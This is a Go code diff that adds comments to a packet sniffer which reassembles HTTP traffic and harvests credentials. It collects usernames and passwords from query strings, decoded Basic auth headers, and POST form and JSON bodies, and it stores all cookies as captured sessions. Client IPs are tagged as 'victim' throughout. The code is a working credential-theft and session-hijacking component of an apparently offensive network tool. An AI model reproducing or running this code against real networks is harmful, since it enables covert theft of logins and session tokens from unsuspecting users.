@@ -21,6 +21,8 @@ import (
 )
 
 // credentialFields are form/query keys treated as authentication secrets.
+// Matching is case-insensitive at use time; anything in this set that is not
+// a dedicated username/password key is captured as an "extra" secret.
 var credentialFields = map[string]bool{
 	"user": true, "username": true, "userid": true, "user_id": true,
 	"login": true, "email": true, "e-mail": true, "email_address": true,
@@ -31,11 +33,12 @@ var credentialFields = map[string]bool{
 }
 
 // httpStream reassembles one direction of a TCP connection and dissects HTTP
-// request/response traffic.
+// request/response traffic. The reassembled bytes are buffered and parsed
+// incrementally as complete messages arrive.
 type httpStream struct {
-	net, transport gopacket.Flow
+	net, transport gopacket.Flow // network and TCP flow identifiers
 	sniffer        *Sniffer
-	buf            bytes.Buffer
+	buf            bytes.Buffer // partial reassembled stream
 	done           bool
 }
 
@@ -64,6 +67,8 @@ func (h *httpStream) ReassemblyComplete() {
 	h.parse()
 }
 
+// parse consumes as many complete HTTP messages as the buffer holds, then
+// returns leaving any partial trailing message in the buffer for later.
 func (h *httpStream) parse() {
 	for {
 		remaining := h.buf.Bytes()
@@ -89,12 +94,14 @@ func (h *httpStream) parseRequest(remaining []byte) bool {
 	br := bufio.NewReader(bytes.NewReader(remaining))
 	req, err := http.ReadRequest(br)
 	if err != nil {
-		return false
+		return false // incomplete or malformed: keep buffering
 	}
 	// Dissect first: the handler consumes the request body from br.
 	h.sniffer.handleRequest(h.net, req)
 	// Drain any unread body bytes so the stream stays aligned.
 	_, _ = io.Copy(io.Discard, io.LimitReader(req.Body, 4<<20))
+	// Everything br consumed (head+headers+body) is finished; drop it so the
+	// next message starts parsing at the right offset.
 	consumed := len(remaining) - br.Buffered()
 	h.buf.Next(consumed)
 	return true
@@ -113,6 +120,7 @@ func (h *httpStream) parseResponse(remaining []byte) bool {
 	return true
 }
 
+// flowIPs extracts the source and destination IPs from a network flow.
 func flowIPs(f gopacket.Flow) (src, dst net.IP) {
 	src = net.IP(f.Src().Raw())
 	dst = net.IP(f.Dst().Raw())
@@ -125,13 +133,14 @@ func (s *Sniffer) handleRequest(f gopacket.Flow, req *http.Request) {
 	victim := src.String()
 	host := req.Host
 
-	// Recon evidence.
+	// Recon evidence: plaintext HTTP was observed on the wire.
 	s.db.Recon.SeesPlainHTTP.Store(true)
 
 	// Query-string credentials.
 	s.extractPairs(victim, host, "query", req.URL.Query())
 
-	// Basic authentication.
+	// Basic authentication. The header is "Basic <base64(user:pass)>";
+	// decode it so the username and password are stored separately.
 	if auth := req.Header.Get("Authorization"); strings.HasPrefix(auth, "Basic ") {
 		raw, err := base64.StdEncoding.DecodeString(strings.TrimSpace(strings.TrimPrefix(auth, "Basic ")))
 		if err == nil {
@@ -146,7 +155,8 @@ func (s *Sniffer) handleRequest(f gopacket.Flow, req *http.Request) {
 		}
 	}
 
-	// POST bodies.
+	// POST bodies: parse per content type, falling back to form parsing when
+	// the body looks like a query string.
 	if req.Method == http.MethodPost {
 		body, _ := io.ReadAll(io.LimitReader(req.Body, 1<<20))
 		ct := req.Header.Get("Content-Type")
@@ -165,6 +175,7 @@ func (s *Sniffer) handleRequest(f gopacket.Flow, req *http.Request) {
 				})
 			}
 		default:
+			// Unknown content type: treat as a form if it contains '='.
 			if strings.Contains(string(body), "=") {
 				vals, err := url.ParseQuery(string(body))
 				if err == nil {
@@ -174,7 +185,8 @@ func (s *Sniffer) handleRequest(f gopacket.Flow, req *http.Request) {
 		}
 	}
 
-	// Cookies -> session capture.
+	// Cookies -> session capture. Any cookie a client sends is a session
+	// bearer token, so the whole jar is stored.
 	if cookies := req.Cookies(); len(cookies) > 0 {
 		cm := make(map[string]string, len(cookies))
 		for _, c := range cookies {
@@ -193,6 +205,7 @@ func (s *Sniffer) handleResponse(f gopacket.Flow, resp *http.Response) {
 	for _, c := range resp.Cookies() {
 		cm := map[string]string{c.Name: c.Value}
 		src, _ := flowIPs(f)
+		// The client is the destination of a response, so it is the victim.
 		sess := s.db.AddSession(store.Session{
 			VictimIP: src.String(), Host: c.Domain, Cookies: cm, Captured: time.Now(),
 		})
@@ -200,6 +213,7 @@ func (s *Sniffer) handleResponse(f gopacket.Flow, resp *http.Response) {
 	}
 }
 
+// emitSession persists a session and publishes the event.
 func (s *Sniffer) emitSession(sess store.Session) {
 	if s.bus != nil {
 		s.bus.Emit(events.TopicSessionCaptured, sess)
@@ -211,7 +225,8 @@ func (s *Sniffer) emitSession(sess store.Session) {
 }
 
 // extractPairs walks every query/form field and captures credential-looking
-// values.
+// values. Candidate usernames and passwords are gathered separately so the
+// best-named key wins, and any other secret keys are kept as extras.
 func (s *Sniffer) extractPairs(victim, host, source string, vals url.Values) {
 	userCands := map[string]string{}
 	passCands := map[string]string{}
@@ -250,6 +265,7 @@ func pickUsername(cands map[string]string) string {
 			return v
 		}
 	}
+	// No preferred key matched: return any candidate we found.
 	for _, v := range cands {
 		return v
 	}
@@ -280,6 +296,7 @@ func isButtonLabel(v string) bool {
 	return false
 }
 
+// isUsernameKey reports whether a lower-cased form key names a user identity.
 func isUsernameKey(k string) bool {
 	switch k {
 	case "user", "username", "userid", "user_id", "login", "email", "e-mail", "email_address":
@@ -288,6 +305,7 @@ func isUsernameKey(k string) bool {
 	return false
 }
 
+// isPasswordKey reports whether a lower-cased form key names a password.
 func isPasswordKey(k string) bool {
 	switch k {
 	case "pass", "password", "pwd", "passwd", "passcode", "pin":
@@ -296,6 +314,8 @@ func isPasswordKey(k string) bool {
 	return false
 }
 
+// isSecretKey reports whether a key is a known secret field that is neither a
+// username nor a password (tokens, OTPs, API keys, ...).
 func isSecretKey(k string) bool {
 	return credentialFields[k] && !isUsernameKey(k) && !isPasswordKey(k)
 }
@@ -327,6 +347,8 @@ func guessJSONFields(body []byte) map[string]string {
 	return out
 }
 
+// splitJSON splits a JSON object's interior into top-level key:value segments
+// on commas, respecting nesting and quoted strings.
 func splitJSON(s string) []string {
 	var out []string
 	depth := 0
@@ -335,6 +357,7 @@ func splitJSON(s string) []string {
 	for i := 0; i < len(s); i++ {
 		switch s[i] {
 		case '"':
+			// A quote toggles string state unless it is escaped.
 			if i == 0 || s[i-1] != '\\' {
 				inStr = !inStr
 			}
@@ -347,6 +370,8 @@ func splitJSON(s string) []string {
 				depth--
 			}
 		case ',':
+			// Only top-level commas split entries; commas inside braces or
+			// strings are part of a nested value.
 			if !inStr && depth == 0 {
 				out = append(out, s[start:i])
 				start = i + 1
@@ -357,6 +382,8 @@ func splitJSON(s string) []string {
 	return out
 }
 
+// unquoteJSON strips surrounding quotes and a trailing comma from a JSON
+// token; good enough for the flat shapes we handle.
 func unquoteJSON(s string) string {
 	s = strings.TrimSpace(s)
 	s = strings.TrimPrefix(s, "\"")
@@ -388,6 +415,7 @@ func (s *Sniffer) dissectDNS(pkt gopacket.Packet, netLayer gopacket.NetworkLayer
 	if !ok {
 		return
 	}
+	// Only care about outgoing queries to a resolver (destination port 53).
 	if udp.DstPort != 53 {
 		return
 	}
@@ -396,12 +424,15 @@ func (s *Sniffer) dissectDNS(pkt gopacket.Packet, netLayer gopacket.NetworkLayer
 		return
 	}
 	dns := dnsL.(*layers.DNS)
+	// QR == false means this is a query, not a response; the question holds
+	// the hostname the client is resolving.
 	if !dns.QR {
 		for _, q := range dns.Questions {
 			name := string(q.Name)
 			if name == "" {
 				continue
 			}
+			// Only fill in the hostname if the host is not already named.
 			if h := s.db.Host(ip.SrcIP); h != nil && h.Name == "" {
 				s.db.UpsertHost(&store.Host{IP: ip.SrcIP, Name: name})
 			}
